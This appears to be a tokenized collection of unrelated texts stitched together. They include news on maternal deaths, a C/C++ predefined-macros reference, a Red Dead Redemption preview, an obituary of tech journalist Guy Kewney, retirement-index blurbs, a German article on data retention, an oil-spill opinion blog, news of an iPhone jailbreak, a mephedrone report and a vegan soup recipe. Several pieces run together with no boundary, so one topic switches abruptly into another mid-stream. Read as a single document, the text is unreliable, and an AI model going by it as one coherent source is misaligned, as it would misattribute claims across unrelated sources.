Two weeks of home bed rest was followed by three weeks of bed rest and monitoring at Huntington Memorial Hospital in Pasadena .
When the baby ’s heart rate plunged March 24 , 2008 , a cesarean was ordered .
In the hospital , Liz had worn pneumatic compression stockings to reduce the chance of blood clots in the weeks before delivery .
Before her death , she had been bedridden for 27 hours .
When she stood , the doctors told her husband , a blood clot dislodged from her leg and traveled to her lungs .
Matt Logelin , disbelieving , stood in the hall outside her hospital room as doctors and nurses worked to revive her .
A state task force on maternal mortality is working to create standards for hospital maternity wards to reduce deaths like these .
Lu says 10 inexpensive steps could be enacted , including a protocol to deal with hemorrhaging that obstetrics teams could regularly practice , and routine use of compression stockings for women who have had C- sections .
The L.A. Department of Public Health has implemented such a program at the city ’s top 10 delivery hospitals .
Another way to reduce maternal deaths would be to strengthen prenatal care for all women , especially women of color and those on public assistance , Strauss said .
Black maternal deaths are nearly four times higher than those of whites .
Amnesty International has called on the federal government to create an Office of Maternal Health to improve the quality of maternal healthcare .
There are no federal requirements to report maternal deaths , and there are only six states that mandate such reporting , much less any formal accounting of the financial and psychological costs to widowers and children who will never know their mothers .
Matt Logelin does n’t blame anyone for his wife ’s death .
“ It did n’t make sense that this could happen to someone like her , someone who follows every precaution the doctor mentions , ” he said .
“ But I ’m not angry .
I want to focus on my child . ”
A former operations manager at Yahoo , he is writing a memoir about his first year as a young widower .
He has started a foundation to assist parents of minor children who have lost a spouse .
He and daughter Maddy have traveled to India , Singapore , France — seeing sights he promised Liz that they would one day see together .
“ I think of all the things Liz has missed , ” Logelin said .
“ I see Maddy doing amazing things , and I start to cry . ”

Pre-defined C/C++ Compiler Macros
The macros are found here :
General guidelines are found here :
Please send updates / corrections to predef - contribute .
Introduction
C and C++ compilers automatically define certain macros that can be used to check for compiler or operating system features .
This is useful when writing portable software .
These pages lists various pre-defined compiler macros that can be used to identify standards , compilers , operating systems , hardware architectures , and even basic run-time libraries at compile - time .
For example , if we want to use a generic or opaque pointer type , we use void pointers .
However , ancient K&R compilers ( from the time before the first ANSI C standard ) do not support void pointers .
Instead we can define our own type :
# if defined ( __STDC__ ) || defined ( __cplusplus ) || defined ( _MSC_EXTENSIONS ) typedef void * t_pointer ; #else typedef char * t_pointer ; #endif
Another example , Microsoft Visual C++ version 4.2 added a pragma to reduce compilation times by only including a file once ( if _MSC_VER is not defined then it will evaluate to 0 ( zero ) — however , some compilers may complain about an undefined macro )
# if defined ( _MSC_VER ) && ( _MSC_VER >= 1020 ) # pragma once #endif
The macros contained in these pages have been obtained through vendor documentation , the defines script , contributors , and third - party source code .
No guarantee about the correctness of the macros is given .
An often - used alternative is Autoconf , which is a more powerful tool to examine various types of features , including compilation options .
However , Autoconf is fairly Unix- centric , and requires a Unix layer on other platforms ( e.g. Cygwin on Windows ) .
Other alternatives are Buildtool , CMake , SCons , PMK , Jam , Ant , and Bakefile .

There are certain games you love from the very first moments .
Half - Life was a classic example – its opening sequence was so assured and so immersive , it set you up perfectly for the grandstanding adventure to come .
Super Mario 64 with its immediately captivating world was the same …
For me , Red Dead Redemption will surely soon be on that list .
I played the finished code for four hours last week and the first time I whistled for my horse and it galloped toward me , muscles rippling , utterly convincing animation ( they motion captured a horse – on a treadmill ) that was it , I was in .
For the first ten minutes , I just trotted up and down the dusty streets of Armadillo , lapping up the perfectly replicated Western iconography ; the lone rider slowly sauntering into town , the drunken gunmen lounging on the steps of the saloon , the prostitutes languidly promenading the balconies , the balls of tumbleweed blowing past …
It 's 1908 and the outlaw John Marston has been left for dead by his gang after a bloody shoot - out .
For him , it 's a chance to start again , to settle down with his wife and leave the criminal life way behind him .
But as all fans of the Western genre know – no one gets out .
Soon , a group of sinister government agents are beating down his door , demanding that he track down his old companions .
To secure his services , they kidnap his wife .
And the game begins .
Red Dead Redemption is a vast , open - world adventure , featuring the largest landscape Rockstar has ever built , and around 450 individual characters .
Alongside the main story missions , players will set off on dozens of minor side - tasks , encounters and objectives , all the time earning fame and – if they behave – honour .
In a structural sense , perhaps , it 's very much the Grand Theft Auto model , but within a dauntingly immense rural environment that features over 40 different types of animals , an active eco-system , and an astonishingly well - realised sense of history .
Indeed , the early twentieth century setting is a masterstroke .
This is n't the mythical heyday of the old west ; that culture is in its death throes .
Throughout the game , technology is encroaching on the area like a virus .
At first , it 's the railroads carving through the landscape , but as you travel north you encounter the first confused telephone users bellowing into handsets , and later , the first production line motorcars .
John Marston is a man at odds with this coming era ; he 's a dinosaur .
And this sense of growing displacement adds poignancy to the action ,
Yet , for the most part , this is a game about wide - open space , about freedom and discovery .
One of the worries with a rural setting is that there will be nothing going on out there .
But this is not the case .
As Rockstar has promised , the landscape is filled with random encounters – you may pass sheriffs chasing down an outlaw , or some poor prospector being bullied by gunmen .
Often , I just headed out onto a ridge and watched – in the distance you might pick up the wisps of smoke from gunfire , or dust flying up from a galloping horse ; both could lead to profitable encounters .
Help a distressed local and they may give you cash , equipment or a treasure map .
The more you do this , the more your honour and fame ratings rise – and soon people will come to you with their troubles .
You will , for example , often see a question mark icon on your radar map in the bottom left of the screen ; head over and you 'll find a civilian with a side - mission – it'll be some sob story about cattle rustlers or a missing family member , but it 's another way to make some cash , and some of these will add intriguing long - running sub-plots to your adventure .
But really , the pleasure is just being out there , galloping about , discovering the world .
You see armadillos scuttling through the bushes , wolf packs pacing the plains , buffalo slowing trudging along bluffs and breaches .
You can hunt animals if you like – shooting and then skinning them to sell their skins at the market .
You can also just watch as the sun sets , sending orange rays across the scrublands , or stand out in the billowing rain as the lighting momentarily illuminates some abandoned outpost or hanging tree in the middle of nowhere .
There are also numerous GTA - like mini-challenges out here , like shooting a set number of vultures , or blasting a series of items within a time limit .
If you 're an obsessive completist , you 'll be in your element .
Apologies , another quick GTA allusion .
In GTA IV , your actions cleverly become part of the social and media landscape ; that messy bank robbery you pulled will appear as salacious fodder on the in - game news channel .
Here , it 's the same .
Kind of .
You can pick up a newspaper for a dollar and read a report of your last gunfight – it'll be there amid humorous adverts for health - reviving chewing tobacco .
Better yet , if you take a ride out into the wilderness at night , you may stumble across groups of travellers telling campfire yarns about your endeavours – a beautiful touch .
The strong sense of characterisation is also hugely familiar : I 've seen a fraction of the game , but have already encountered some memorable personalities .
Marshal Johnson is a highlight , a laconic and reluctant lawman , just trying to keep his crappy town on the right side of hell .
He 's given immense gravitas by an excellent voice acting performance that makes a mockery of Heavy Rain 's many travails into wooden lifeless recitation .
I also loved the dandy New York reporter Jimmy Saint who 's come down here to write about the West for the ladies back in NYC .
" I 'm gonna have some wild adventures ! " he cries – and you just know it 's going to go horribly wrong for him .
And of course , this would n't be a Rockstar title without at least one knockabout stereotype – enter Irish , the whisky - swilling ne'er - do - well who 'd double cross his grandma for a dram of liquor .
The control mechanic is a successfully refined version of the GTA IV system , with some context - relevant additions .
The left trigger draws and aims your gun , an action that 's considered provocative by most of the population so it 's best not to practice it in a crowded street .
The amount of auto - aim is decided by the skill level you select at the beginning of the game .
Go for Casual and hitting the button will lock onto a target and stay with them until you let go ; in Normal , it 'll lock on until you move the right analogue stick , providing some manual ability to re-target ; and on Expert , there 's no auto - aim at all , cowboy .
It 's a nice flexible set - up , and though it 's easy to pinpoint enemies , these are crude weapons and they do n't always fire exactly where you 're aiming – a realistic touch that rarely frustrates ( perhaps because sometimes my aim was off , but I still managed to clip my target thanks to the vagaries of firing an antiquated Colt pistol at a moving target 50 yards away . )
The right shoulder tab locks you on to cover , from where you can comfortably shoot at enemies without too much exposure .
Tapping it again releases you , and it's a really quick mechanic allowing you to build a nice rhythm as you approach an enemy stronghold , snaking in and out of barrels , outhouses and boulders ( there 's also a crouch mechanic , accessible by pressing the left analogue stick , which adds to your sneaking power . )
The famed Dead Eye system is triggered by pressing the right stick .
This slows time and allows you to place pinpoint shots on your target – as long as there 's some juice in your gauge ( easily charged by buying tonics at the local store , or simply by successfully killing people ) .
Sure , bullet time systems have fallen out of fashion , but this one is awesome fun , bringing to mind Peckinpah 's fabulous slow - mo shoot - outs .
The system can be upgraded twice throughout the game – at first , you need to manually place your shots , but later the system will automatically pinpoint body areas , so you just have to point , shoot and go and loot the resulting carcass ( which is a great way to come by extra cash , ammo and other goodies ) .
The running mechanic is interesting .
You repeatedly hit the A button until you get to the speed you want , then keep it pressed .
This works on the horse too , allowing you to reach an impressive gallop – though the beast 's stamina wears down quickly , especially when you venture off the dirt tracks and onto rough country terrain .
If you 're riding with another character , once you 've reached the same speed as their horse , you can lock in to a sort of cruise control mode , which allows you to relax and listen to the dialogue – lots of vital mission information is often rattled out en route to the next bloody showdown .
Shoot - outs are just gloriously entertaining .
One minute you 're pinned in behind a rocky outcrop , taking pot shots with your rifle , the next , you 're whistling for your horse , then galloping in , blasting your scuttling enemies as they run for cover .
You 've probably seen the extravagant bullet impact animations - stricken enemies writhe with each entry , or , when on the wrong end of a shotgun blast , simply fly backwards in a grotesque somersault .
It possibly should n't be utterly satisfying , but it is .
At one point I used Dead Eye to shoot an enemy off his horse , then , as he span hopelessly in the air , plugged him once more before he hit the floor .
I 'm sorry , but it was beautiful .
Naturally , there 's a whole host of weapons to collect , including revolvers , shotguns , sniper rifles , knives and Gatling guns .
As you venture toward the north of the map , you 'll encounter the first automatic handguns , adding quite a sting to your fire - rate .
And of course there 's the lasso , for capturing bad guys .
Bounty hunting missions are another nice way to earn cash , and you 'll usually earn double for bringing the criminals back to the jail in one piece ( though mine usually get returned with a few sundry bullet wounds to the legs – well , they run vast , these villains ) .
Brilliantly , there 's also a range of equine transport options from mules to thoroughbred stallions ; players can even steal a stage coach and scorch through the wilderness with four horses under their command ( for real fans , one challenge involves a stage coach race . )
I have n't yet sampled the multiplayer , but it 's an intriguing prospect .
Alongside standard competitive deathmatch and team deathmatch options , you can go for the Free Roam mode , which will drop up to 16 players into a compete rendition of single - player landscape , complete with officers of the law .
From here , you can form a posse , hunt animals or engage in challenges – it's essentially a glorified lobby system ; but a lobby system in which you and your friends can attack a bear with a hunting knife .
So yes , I 'm four hours in , and I can't wait to return .
Rockstar San Diego ( aided by Rockstar 's other studios – they 've developed something of a hive mind approach these days ) would seem to have created an incredible open - world experience that just oozes Western authenticity .
Of course , Leone will be chucked about as a frame of reference , and he 's definitely there in the visual poetry of the game , the vultures circling in the dying sunlight , the riders swooping into town through billowing dust clouds .
But more than that , I see the raw brutality and grit , the sheer nihilism , of Peckinpah and Walter Hill .
Red Dead Redemption is an existential drama – it's you alone in a chaotic world .
You can add to that chaos ( the temptation to just mosey into a saloon and shoot the place up is difficult to resist at times ) or you can craft some dignity out of it .
But there is always somebody out there waiting , somebody you need to kill .
• Red Dead Redemption is released on PS3 and Xbox 360 on 18 May in the US and 21 May in the UK
RIP
When I first met Guy Kewney , who died early this morning after a long struggle with cancer , he was already firmly established as star columnist at Personal Computer World - then , and for years to come , the UK 's flagship IT publication .
Until he started working for The Register a couple of years back , that was one of the few occasions when we found ourselves working on the same team .
And even then , only sort of .
We at PCW stablemate Personal Computer News regarded it as our mission to try to scoop the PCW aristocracy down the hall at every available opportunity , even to the extent of stealing their review kit from reception .
It made for some interesting evenings down the pub after work , but Guy was perfectly civil about it , and always ready with helpful advice for the young upstarts .
Was it PCW 's Elan Enterprise I swiped ( finally , I admit it ) , or was it What Micro's ?
Whatever , publisher VNU finally woke up to the insanity of competing with itself and pink - slipped PCN .
Other titles faded as the 80s home computing boom faded , but PCW and Guy sailed on , with Guy as the IT guru normal people had quite possibly heard of - and the one the vendors needed to talk to .
I remember an awe - struck staffer returning from a visit to Guy 's terraced house in Hackney , babbling that he did n't have any carpets but that he did have his own PBX system , which in 1983 was non-trivial cabling to have running up and down your staircase .
And not a lot of IT writers were chums with the late Douglas Adams , author of the Hitchhiker 's Guide , either .
Or able to survive ( absolutely unscathed ) costing his publishers a large sum of money to pay for a new encryption system for Acorn , after he 'd published a crack in his column .
Felix Dennis , who'd got his start on the ladder to vast wealth by selling PCW to VNU , had been brought in by the company as launch consultant for PCN , and around the same time had launched his own weekly , MicroScope , bringing in Guy as a star ( naturally ) writer .
I worked there briefly after VNU had changed the locks on us , and Guy - in shorts , socks and sandals - would sit tapping away in a totally bizarre orthopaedic chair .
He was endearingly eccentric in oh so many ways ...
By the time I got back to MicroScope a couple of years later Guy was gone - pinched , along with a clutch of other key writers , by VNU for PC Dealer , which it launched against MicroScope .
Guy remained a friend throughout , but he 'd clearly become the man that any self - respecting tech publisher mounting a big push absolutely needed to have on board .
So when Ziff Davis invaded Europe and looted the UK IT press for staff , he naturally had to be the biggest of guns on PC Magazine UK .
He was possibly even more the enemy in this period , but as always , in the nicest possible way .
Once the ZD onslaught had burnt out , Guy was back at PCW , with which he 'd remained , and will remain , inextricably identified .
The money was starting to leak out of paper publishing by then , but like the true pro he was he picked up other jobs , started his own site and blog , and started writing for The Reg , where he marked the closure of PCW just under a year ago .
Joe Fay and I were due to buy him the lunch we owed him a couple of weeks back , but that was the day he took a bad turn , so it looks like we 'll just have to owe him .
He posted brave updates on his condition , entirely without self - pity , until last week on Twitter and his blog .
We 're sorry you missed that couple of months of gentle recovery , Guy .
And we really wish you could have made that lunch .
We 'll miss you . ®

5 Countries With the Best Healthcare in the World
One of the main concerns of any person looking to retire overseas is the quality of healthcare .
Is it possible to get medical treatment as good as what ’s available in the U.S. and Canada ?
The answer …a resounding yes .
Sometimes it ’s even better than what ’s on offer at home , and at a more affordable price too .
Measuring the quality of healthcare is difficult , and it ’s hard to put a number on it .
We can , however , put a number on the price of medical procedures .
And these costs ( as well as quality ) helped us score each of the 24 countries in the healthcare category of International Living ’s 2018 Global Retirement Index .
Read here to learn more about the top five countries in the world for healthcare .
In each of these countries you ’ll find clean , excellent hospitals , highly trained doctors , and affordable care .
The Best Climates in the World
One of the best things about moving overseas is that you can choose a country where the climate is better than your own .
Escape harsh winters and gloomy rainy days and move to a place where the weather is better .
Are you after surf and sun ?
Your best climate could be waiting in Europe , Asia , or Latin America .
Like clean air and mountain scenery ?
Your best climate might be up in the peaks of Ecuador , or in cultural Spain .
The world is a big place with lots of places to choose .
In fact , choosing the best climate from all the possible destinations in the world could be an overwhelming task .
That ’s where we ’d like to help .
Find out which countries scored the best in the climate category and what country ultimately took top spot for best climate for 2018 .
Great Places to Retire
Where it ’s Easy to Fit In
When planning your retirement overseas , many factors come into play .
Low costs , real estate , and healthcare are some of the main concerns … but what about being able to mix well with the community or make friends with the locals ?
If you can integrate easily in your new surroundings it will help to ensure that you feel safe , secure , and — most importantly — at home in your new home .
Do the locals speak English or do you speak the local language ?
Do expats feel welcome and involved in the new community ?
Are there groups and clubs available to join ?
IL ’s Annual Global Retirement Index takes all these aspects into account when rating and ranking its top retirement destinations .
Because the sense of “ fitting in ” is so important when looking for an overseas retirement destination , it has been given its own category .
Here are the six countries that came out on top in our fitting in category .
The Top 5 Retirement Havens With the Lowest Cost of Living
While you should n’t move overseas solely because a country is a cheap place to live , in today ’s current economic climate , cost of living is a major factor .
The category evaluates things like day - to - day expenses — from the cost of a flight back to the U.S. groceries , rent , movie theater tickets , eating out , garbage collection , gas , gym membership , and all the hidden and often unconsidered costs .
Find out more about the best retirement havens in the world , where your dollar will stretch further …in places where you ’d actually want to live .
Discover the top five places to retire overseas with the lowest cost of living here .

Bundesregierung kann nicht sagen , ob Vorratsdaten zur Strafverfolgung erforderlich waren Florian Rötzer
Unklar bleibt auch , ob die bereits vor dem Urteil des Bundesverfassungsgerichts den Behörden übermittelten Daten weiter verwendet werden oder gelöscht wurden
Im März hatte das Bundesverfassungsgericht das Gesetz zur Vorratsdatenspeicherung für grundgesetzwidrig erklärt und die Löschung der Daten angeordnet .
Die Vorratsdatenspeicherung wurde zwar nicht grundsätzlich zurückgewiesen , aber nach Ansicht des Gerichts müssen die Speicherung und Verwendung der Daten genau geregelt werden ( Sieg oder Niederlage ? ) .
Das Gericht monierte auch , dass das Gesetz nicht nur auf die Verfolgung schwerer Straftaten beschränkt war , sondern über die EU - Richtlinie hinaus auch " mittels Telekommunikation begangene Straftaten " umfasste .
Deutlich hieß es im Urteil : " Es liegt indes in der Natur der Garantie des Art. 10 Abs. 1 GG und der hiermit verbundenen Verhältnismäßigkeitsanforderungen , dass nicht jede Maßnahme , die für die Strafverfolgung nützlich und im Einzelfall auch erforderlich sein kann , verfassungsrechtlich zulässig ist . "
Allerdings ließ das Gericht es zu , dass das Abfragen persönlicher Daten bei einer IP - Adresse selbst bei " besonders gewichtigen " Ordnungswidrigkeiten legitim sein könne ( Kein Fest für Filesharingfreunde ) .
Das Innenministerium , der BKA oder die Gewerkschaft der Polizei warnten davor , dass damit die Kriminalitätsbekämpfung beeinträchtigt würde .
In einer Kleinen Anfrage der Linksfraktion wird die Bundesregierung aufgefordert , " nachvollziehbare , überprüfbare und bewertbare Zahlen zum Umfang der bisherigen Vorratsdatenspeicherung , der daraus hervor gegangenen Ermittlungs - und Strafverfahren , sowie Verurteilungen zur Verfügung " zu stellen .
In ihrer Antwort erklärt die Bundesregierung , dass das Bundesverfassungsgericht nicht das gesamte Gesetz als nichtig erklärte hatte , sondern nur bestimmte Teile .
In Kraft getreten war das Gesetz am 1 .
Januar 2008 , ab 1 . Januar 2009 wurden auch die Internet - Verbindungsdaten gespeichert .
2008 wurde nach Auskunft des Bundesjustizministeriums " in 8.316 Ermittlungsverfahren 13.426 Erst - und 478 Verlängerungsanordnungen nach 100g Absatz 1 StPO erlassen wurden " .
Hier konnte auf gespeicherte Daten zugegriffen werden .
Bei 12.469 Fällen handelte es sich um Straftaten von erheblicher Bedeutung , in 1.414 Fällen " ( auch ) mittels Telekommunikation begangene Straftaten " .
Vom 1 . Mai 2008 bis zum 31 .
August 2009 wurde in 10.359 Ermittlungsverfahren 19.877 Erst - und 666 Verlängerungsanordnungen nach § 100g StPO erlassen .
Dabei wurde bei 8.551 Anordnungen in 4 707 Verfahren auf allein nach § 113a TKG gespeicherte Daten zugegriffen .
Bei weitern 2.247 Verfahren lässt sich das nicht sagen .
Bei 1.263
Verfahren ging es um " ( auch ) mittels Telekommunikation begangene Straftaten " .
Keine Auskunft geben konnte die Bundesregierung , in wie vielen Fällen es zu einer Verurteilung gekommen ist und wie viele zusätzliche neue und andere Täter und Straftaten mittels der Vorratsdaten entdeckt wurden .
Auch ob es Zugriffe aufgrund von Gefahrenabwehr gegeben hat , weiß die Regierung nicht .
Angeben kann sie auch ( noch ) nicht , welche Straftaten bei einem Verzicht auf Vorratsdaten nicht mehr verfolgt werden könnten und ob daraus eine Sicherheitslücke entsteht .
Zudem weiß sie nicht , ob die bereits den Ermittlungsbehörden zugegangenen Vorratsdaten schon gelöscht wurden .
Die Bundesregierung verweist bei der weiteren Verwendung auf den Generalbundesanwalt beim Bundesgerichtshof , der die weitere Verwendung der Daten , die während der Geltung des Gesetzes erhoben wurden , als zulässig betrachtet .

Spill , Baby Spill : Explosion Gives Environmentalists Regulation Firepower
The massive explosion and subsequent oil spill of a rig in the Gulf of Mexico may lead to reinstating the expired moratoriums on off - shore drilling as well as new regulations , which oil giant BP says it is expecting .
The “ Drill Baby Drill ” proponents are eerily silent as the oil spill in the Gulf , which could become one of the worst recent environmental disasters of this nation , threatens hundreds of species of fish , birds and other wildlife .
Could it be shame ?
Or perhaps they are not capable of the sort of reflection needed for shame , in which case , their silence is simply the most expedient choice at the moment .
Either way , sane people must seize the moment to step into the five seconds of jingoistic silence and make their voices heard .
Advertisements
Now is the time to introduce environmentally sound legislation , and stepping up to the plate are Democrats Bill Nelson of Fla who is asking the administration to postpone plans for off - shore drilling expansion and Edward Markey of Mass to discuss environmental risks with off - shore drilling .
Sen. Bill Nelson , D - Fla. , is introducing legislation that would block the Obama administration from acting on its plans to expand offshore oil and natural gas drilling .
“ In a letter to President Obama , Nelson writes that the Deepwater Horizon oil rig explosion and subsequent leak in the Gulf of Mexico requires the administration to “ postpone indefinitely plans for expanded offshore drilling operations . ”
Meanwhile , the Hill reports that “ Edward Markey ( D - Mass . ) is calling on top officials from ExxonMobil , ConocoPhillips , Chevron , BP and Shell to appear before the Select Committee on Energy Independence and Global Warming , which he leads .
The hearing — which has not been scheduled — will provide a high - profile forum for discussing environmental risks in the wake of last week ’s oil rig explosion , which has created a major spill that crews are struggling to contain . ”
The Wall Street Journal reports that BP is expecting tougher regulations to be introduced :
“ The chief executive of BP PLC said in an interview Thursday he expects a tougher regime for oil companies as a consequence of the spill .
BP hired the rig that caught fire and sank , resulting in the spill .
“ Regulators will want to understand how this occurred and quite reasonably wish to introduce additional regulation , if that ’s appropriate , to prevent it happening again , ” Chief Executive Tony Hayward told The Wall Street Journal .
“ You certainly wo n’t see BP standing in the way of that . ”
Asked whether the spill could prompt calls for a moratorium on drilling in the Gulf of Mexico , he said : “ I ’m certain some people are thinking that might be necessary . ”
When even the WSJ is reporting that oil companies expect tougher regulations , we have to know the time to act is NOW .
The issue is not only common sense regulations and reinstating the moratorium on off - shore drilling , but also investigating the regulator in charge of oil rigs , the Department of Interior ’s Minerals Management Service , which has a dubious record .
The New York Times reported in Sept of 2008 on the ethics scandal of the Dept of Interior :
“ The reports portray a dysfunctional organization that has been riddled with conflicts of interest , unprofessional behavior and a free - for - all atmosphere for much of the Bush administration ’s watch …
The investigation also concluded that several of the officials “ frequently consumed alcohol at industry functions , had used cocaine and marijuana , and had sexual relationships with oil and gas company representatives . ”
The investigation separately found that the program ’s manager mixed official and personal business .
In sometimes lurid detail , the report also accuses him of having intimate relations with two subordinates , one of whom regularly sold him cocaine . ”
In other words , heck of a job , Brownies .
Regulations are irrelevant if regulators are not doing their jobs .
As responsible stewards of this land , Democrats need to band together to insist upon their platform of environmentally sound energy policies and competent regulators .
I would suggest that the morally repugnant idea of saddling our children with debt also applies to saddling our children with an environmentally poisoned world bereft of wildlife , so that one would hope that all reasonable people of both parties could come together on this issue , but I am not holding my breath on this one .
The Obama White House announced that it will not authorize any more offshore oil drilling until it ’s determined what caused the explosion .
David Axelrod told ABC ’s “ Good Morning America ” that “ no additional drilling has been authorized and none will until we find out what has happened here . ”
A new " jailbreak " for the iPhone 3GS and iPad was released this weekend by hackers , and allows users to run third - party software with features not authorized by Apple , including multitasking .
Dubbed " Spirit , " the software for Windows and Mac OS X allows users to jailbreak their iPhone OS device , including firmware 3.1.2 , 3.1.3 , and the iPad- exclusive 3.2 .
The practice of jailbreaking allows users to run code not approved by Apple on their mobile device .
The hack was released by a coder who goes by the handle " comex , " and is a member of the Dev Team group .
They , along with George " Geohot " Hotz , are the most high - profile hackers of the iPhone OS .
The Spirit jailbreak was first demonstrated on the iPad in early April .
The release was delayed until after the iPad 3G went on sale last Friday to ensure it would work with the new hardware .
The jailbreak installs Cydia , an unauthorized digital storefront that is the hackers ' equivalent of Apple 's own App Store .
It includes unauthorized software such as " Backgrounder , " which allows users to run more than one application at once .
Early reports indicate that Backgrounder works on the iPad , though most other Cydia software created for the iPhone must be updated to run on the larger 9.7 - inch screen .
Previously , many iPhone 3GS users could only use a " tethered " jailbreak released by Hotz .
This method meant users of the latest iPod touch , and any iPhone 3GS released in October 2009 or later , could not perform a hardware reset of the phone without connecting it via USB cable to a computer .
The Spirit jailbreak is not tethered .
Last year , Apple updated the BootROM for the iPhone 3GS to iBoot - 359.32 in a mid-cycle hardware release in October — the first time ever that the handset maker modified its hardware in the middle of a product line , without a new model released .
That update has slowed hackers in their ongoing game of cat and mouse with Apple .
Image caption Louis Wainwright , 18 , and Nicholas Smith , 19 , died in March
Toxicology tests have shown that two teenagers whose deaths were linked to mephedrone had not taken the drug .
The deaths of Louis Wainwright , 18 , and Nicholas Smith , 19 , in March 2010 sparked concern about the synthetic stimulant , which was then legal .
The Labour government banned the " legal high " in April , making it a Class B drug .
Former chief drugs adviser Prof David Nutt said the test results undermined the reasons behind the ban .
But Professor Les Iverson , the current chairman of the Advisory Council on the Misuse of Drugs ( ACMD ) , said the decision to recommend a ban on mephedrone was based on " thorough research " .
Categorisation row
It is thought further tests are being conducted to try to establish what , if any , substances the pair had taken .
Mephedrone - also known as Meow , Bubbles and M - CAT - is derived from cathinone , a compound found in a plant called Khat .
Humberside Police , which carried out the initial investigation into the teenagers ' deaths , said in March it had " information to suggest these deaths are linked to M - CAT " .
At the time , police believed the pair , both from Scunthorpe , had been drinking and had also taken methadone - a similar - sounding but completely different drug to mephedrone .
On Friday , a spokeswoman said the force could not confirm or deny the results of the toxicology tests .
She said : " The pathology report , which includes toxicology findings , is prepared on behalf of the coroner and is not yet complete .
" The findings of the report , once completed , will be forwarded to the coroner and may be discussed at any inquest and will not be disclosed without the authority of HM Coroner . "
North East Lincolnshire Coroners Court has refused to comment ahead of the inquest .
Political aspects
At the time , the ban on mephedrone - which catagorised it alongside amphetamines and cannabis - caused a row amongst some politicians and scientists .
The Advisory Council for the Misuse of Drugs ( ACMD ) had recommended a ban , saying the substance was " likely to be harmful " despite incomplete research .
Analysis Until Louis Wainwright and Nicholas Smith died most people had n't heard of mephedrone .
But the teenagers ' deaths , moving interviews with their parents and police warnings about the drug changed all that .
Suddenly there was an urgency to the Advisory Council on the Misuse of Drugs ' review into mephedrone , which it had embarked on several months earlier .
A fortnight after the teenagers died , the ACMD 's review was completed : its recommendation that mephedrone should be banned was immediately accepted by the then Home Secretary , Alan Johnson .
It all happened before the election , prompting claims that the ban was a political move and ministers should have waited for further evidence .
These latest developments will fuel those accusations : but the evidence gathered by the ACMD about the dangers of mephedrone pointed towards a ban - regardless of the tragic events in Scunthorpe .
But the leading medical journal The Lancet questioned the ban , saying it had been rushed and politics had been allowed to " contaminate " science .
Two members of the committee quit in quick succession during the row .
One of them , Eric Carlin , told BBC Radio 4's PM programme the decision to ban the drug should be " revisited " in light of the findings , and the " public health consequences " of the ban needed to be considered .
" The fact these two people died and it's not actually connected with mephedrone just emphasises the fact that we were under a lot of pressure to ban this drug and these cases were actually cited as being examples of why that was necessary , " he said .
Prof Nutt , who was sacked by the then Home Secretary Alan Johnson in October 2009 , said the findings were " embarrassing " for the government , media and police .
" If these reports are true , the previous government 's rush to ban mephedrone never had any serious scientific credibility - it looks much more like a decision based on a short - term electoral calculation .
" This news demonstrates why it 's so important to base drug classification on the evidence , not fear , and why the police , media and politicians should only make public prouncements once the facts are clear . "
Campaign group the UK Drug Policy Commission said it hoped there would be a " fresh look at different ways of formulating drug policy " .
Chief executive Roger Howard said : " We believe the new government has an opportunity to both better protect the public and save money by reshaping the architecture for decision - making .
" Getting the governance right will lead to better outcomes for every community in Britain , and rebuild trust between experts and politicians . "
However , ACMD chief Prof Iverson said : " The ACMD gathered evidence from a number of experts and thoroughly researched the cathinones including mephedrone before making its recommendation .
" On the basis of this evidence , and in comparison with similar substances , it concluded that the harms associated with cathinones equate to other dangerous substances in Class B , particularly amphetamines which are structurally similar and act on the central nervous system in the same way . "
Mephedrone has been implicated in the deaths of 34 people in the UK - 26 in England and eight in Scotland .
But so far , the drug has been established as a cause of death in only one case in England , that of John Stirling Smith .
On Thursday , a coroner in Brighton said Mr Stirling Smith , who was 46 and had underlying health problems , died after after " injecting mephedrone repeatedly " .
The European Union has also ordered a report into the health and social risks of mephedrone from the European Monitoring Centre for Drugs and Drug Addiction .

Okay , let ’s get strip 93 back up here .
I meant to blog earlier , but I was tired from my Portland blog - blitz and my poor mom went into hospital this week !
She , typically , did not tell me she was n't feeling well ( some people are complainers -- I wish my mom would complain more ! ) , so , when I went to see her , I was shocked at how wheezy and rattly her chest was and how weak she was -- she is generally in very good health .
( She still was dressed to go , with her hair up and make - up on , at 92 ! )
Whisked her off to her doctor , who told us to get her to hospital right away .
Turns out she had congestive heart failure ( water in heart and lung tissues ) !
So she is still there , but feeling better and not on so much oxygen .
My stepson Sean saw her last night and said she had finished the book she was reading and had make - up on -- a good sign !
Anyway , I have been reading about Peruvian food ( some of you may know that my father was Peruvian ) and also about breakfast in different countries , so this blog is a combination of those two interests .
In Peru , depending on where you live , and probably your economic status , a typical breakfast ( desayuno ) might be a sweet bun , baguette , or some other kind of bread ( mostly white ) with coffee .
( I remember it being cafe con leche , or , basically , a latte , when I was there . )
But it could also be fruit , a sandwich , scrambled eggs , cheese , a Peruvian tamale or humita ( a sweet tamale ) , even beans or stews .
Sounds good to me -- I like savory things for breakfast .
( Another interesting snack and breakfast is a fruit and oatmeal drink [ taken hot or cold ] called Avena or Cuaquer [ Spanish translation of " Quaker " , for the oats ! ] .
It 's popular in Latin America , especially Peru and Ecuador .
I 'll work on that for another post and I 'm anxious to run it by my youngest daughter -- her son is part Ecuadorian as well as part Peruvian . )
Another common breakfast item is soup ( sopa ) , and a favorite one isCaldo de Gallina , sometimes called " Peruvian penecillin " , just like Jewish chicken soup !
( It 's also called " levanta muertos " , or " wake the dead " ! )
I 'm told that it is a favored cure - all of Peruvian mothers .
So , especially since I woke up with a sore throat , I decided to try making a vegan version of this for my Sunday breakfast .
I have always enjoyed leftover soup for breakfast .
( I would advise making this the day before , so you do n't have to cook first thing .
It makes lots , so you can have it for a few days . )
It 's important that you use a good , rich - tasting vegan " chicken " broth for this recipe , so please read this blog entry on that subject .
Traditionally , the vegetables are strained out of the broth ( since they cook down to nothing after 3 - 4 hours of making real chicken broth from scratch ) , but I left the onions and carrots in the broth , for extra flavor , nutrition , and color .
I also decided to mash up the cooked head of garlic and throw it in .
It 's good for you and the taste is very mellow .
I think it was a good move .
( The ginger , by the way , shows the influence of the large Chinese population on Peruvian cooking . )
The soup is often served with hard - boiled eggs , but not always .
I have added a scrambled tofu option , but you can do without it , if you like .
I live on an island , and the only store is closed on Sunday , so I could n't rush out to find fresh red chiles , limes and cilantro ( if they even had them at our little store -- well , maybe the limes ) , so that 's why I gave the options for the dried chile flakes and dried cilantro , added parsley as a green garnish option , and used lemon wedges .
I loved this , and , I do n't know if it 's the soup or not , but I feel better !
Printable Recipe
